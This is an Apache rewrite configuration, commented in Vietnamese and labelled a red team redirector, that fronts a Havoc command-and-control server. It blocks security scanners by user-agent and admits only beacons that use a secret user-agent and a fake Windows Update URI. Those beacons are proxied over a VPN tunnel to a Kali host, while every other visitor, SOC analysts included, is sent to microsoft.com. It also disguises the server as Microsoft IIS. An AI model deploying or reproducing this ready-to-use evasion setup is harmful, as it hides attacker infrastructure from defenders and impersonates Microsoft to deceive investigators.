###########################################################
# RED TEAM REDIRECTOR - APACHE CONFIGURATION
###########################################################

RewriteEngine On

# [PHẦN 1] - ANTI-ANALYSIS & CLOAKING
# Chặn các User-Agent từ các máy quét tự động và giới phân tích
RewriteCond %{HTTP_USER_AGENT} ^.*(nmap|nikto|nessus|qualys|acunetix|dirbuster|sqlmap|censys|shodan).* [NC]
RewriteRule ^.*$ - [F,L]

# [PHẦN 2] - ĐIỀU KIỆN LỌC BEACON (CONDITIONAL REDIRECTION)
# Chỉ những Request thỏa mãn đồng thời 2 điều kiện dưới đây mới được vào C2
# 1. Khớp User-Agent bí mật (đã cài đặt trong Havoc)
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5.0\ \(Windows\ NT\ 10.0;\ Win64;\ x64\)\ Chrome/121.0.0.0 [NC]

# 2. Khớp URI giả lập Windows Update
RewriteCond %{REQUEST_URI} ^/msdownload/update/v3/static/.* [NC]

# [PHẦN 3] - PROXY VÀO VPN TUNNEL
# Đẩy traffic qua interface tun0 tới Kali 2
# [P] = Proxy, [L] = Last Rule, [NE] = No Escape
RewriteRule ^(.*)$ http://10.8.0.2:443/$1 [P,L,NE]

# [PHẦN 4] - FALLBACK (MẶT NẠ CHO SOC/GUEST)
# Tất cả các truy cập không hợp lệ sẽ bị đẩy về website thật của Microsoft
RewriteRule ^.*$ https://www.microsoft.com [R=302,L]

# [PHẦN 5] - XÓA DẤU VẾT SERVER (FINGERPRINTING)
# Giả dạng Apache thành IIS 10.0 của Windows Server
Header unset X-Powered-By
Header unset Server
Header set Server "Microsoft-IIS/10.0"
Header set X-Content-Type-Options "nosniff"
